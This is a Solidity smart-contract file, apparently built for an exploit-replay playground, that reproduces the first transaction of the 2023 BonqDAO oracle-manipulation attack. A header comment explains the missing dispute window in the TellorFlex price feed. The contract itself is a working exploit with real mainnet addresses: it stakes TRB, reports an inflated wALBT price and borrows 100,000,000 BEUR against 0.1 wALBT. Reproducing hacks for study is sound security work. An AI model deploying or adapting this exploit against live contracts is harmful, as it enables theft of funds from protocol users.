// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for the EVM Playground (2023-02-BonqDAO).
// The DeFiHackLabs PoC's `Exploit` contract inherits `Test` for cheatcodes and its
// `Attacker` harness (test/BonqDAO_exp.sol) has THREE tests: testAttackTx1 (mint
// massive BEUR against an inflated wALBT price), testAttackTx2 (liquidate every
// other borrower after crashing the price), and testExploit (both, back to back,
// jumping the block/timestamp forward between them with vm.roll/vm.warp).
//
// This playground reproduces Tx1 ONLY (tx1_mintMassiveAmountOfBEUR), the more
// famous, self-contained half of the attack. Combining both transactions into one
// recorded call was investigated and found infeasible: TellorFlex.submitValue()
// rejects a second report for the SAME queryId at the SAME block.timestamp
// ("timestamp already reported for" — see TellorFlex.sol's reporterByTimestamp
// guard). The playground engine fixes ONE block/timestamp for an entire replay
// (deploy + setup + the single recorded attackFunction call), so Tx1's price
// report and Tx2's price report would collide on the same queryId + timestamp if
// both ran in one call — real block.timestamp cannot advance mid-transaction, which
// is exactly why the real attack needed two separate transactions ~110 seconds
// apart. Tx1 alone has no such collision (it submits exactly one price report) and
// reproduces cleanly from the single dumped snapshot.
//
// Root cause: BonqDAO reads wALBT's price straight off TellorFlex with no dispute
// window (should require a value that has survived a challenge period via
// getDataBefore()). Any staker can submitValue() a fresh, unchallenged price that
// takes effect immediately, so the attacker stakes 10 TRB, reports an absurdly
// high wALBT price, and borrows 100,000,000 BEUR against just 0.1 wALBT collateral.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface ITellorFlex {
    function getStakeAmount() external view returns (uint256);
    function depositStake(uint256 _amount) external;
    function submitValue(bytes32 _queryId, bytes memory _value, uint256 _nonce, bytes memory _queryData) external;
}

interface IOriginalTroveFactory {
    function createTrove(address _token) external returns (address trove);
}

interface ITrove {
    function increaseCollateral(uint256 _amount, address _newNextTrove) external;
    function borrow(address _recipient, uint256 _amount, address _newNextTrove) external;
}

contract BonqDrain {
    ITellorFlex constant TellorFlex = ITellorFlex(0x8f55D884CAD66B79e1a131f6bCB0e66f4fD84d5B);
    IOriginalTroveFactory constant BonqProxy = IOriginalTroveFactory(0x3bB7fFD08f46620beA3a9Ae7F096cF2b213768B3);
    IERC20 constant TRB = IERC20(0xE3322702BEdaaEd36CdDAb233360B939775ae5f1);
    IERC20 constant WALBT = IERC20(0x35b2ECE5B1eD6a7a99b83508F8ceEAB8661E0632);
    IERC20 constant BEUR = IERC20(0x338Eb4d394a4327E5dB80d08628fa56EA2FD4B81);

    address maliciousTrove;
    address maliciousTrove2;

    // Entrypoint: Tx1 only — mint massive BEUR against an inflated wALBT price.
    // Mirrors Attacker.testAttackTx1() / Exploit.tx1_mintMassiveAmountOfBEUR().
    function run() external {
        // func_0xa11ce20c
        PriceReporter reporter = new PriceReporter();
        TRB.transfer(address(reporter), TellorFlex.getStakeAmount()); // transfer 10 TRB to price reporter
        reporter.updatePrice(10e18, 5e27);

        // Use 0.1 wALBT as collateral, borrow massive amount of BEUR
        maliciousTrove = BonqProxy.createTrove(address(WALBT)); // attacker create a new trove
        WALBT.transfer(maliciousTrove, 0.1 * 1e18); // transfer 0.1 wALBT to trove as collateral
        ITrove(maliciousTrove).increaseCollateral(0, address(0));
        ITrove(maliciousTrove).borrow(address(this), 100_000_000e18, address(0)); // borrow 100,000,000 BEUR

        // Create another trove for attack Tx2 (kept for fidelity with the original
        // sequence — Tx2 itself is not reproduced by this playground, see header).
        maliciousTrove2 = BonqProxy.createTrove(address(WALBT));
        WALBT.transfer(maliciousTrove2, WALBT.balanceOf(address(this)));
        ITrove(maliciousTrove2).increaseCollateral(0, address(0));
    }

    function updatePrice(uint256 _tokenId, uint256 _price) external {
        bytes memory queryData =
            hex"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000";
        bytes32 queryId = keccak256(queryData);
        bytes memory price = abi.encodePacked(_price);
        TRB.approve(address(TellorFlex), type(uint256).max);
        TellorFlex.depositStake(_tokenId);
        TellorFlex.submitValue(queryId, price, 0, queryData);
    }
}

contract PriceReporter {
    function updatePrice(uint256 _tokenId, uint256 _price) external {
        (bool suc,) = msg.sender.delegatecall(abi.encodeWithSignature("updatePrice(uint256,uint256)", _tokenId, _price));
        require(suc, "Update price failed");
    }
}
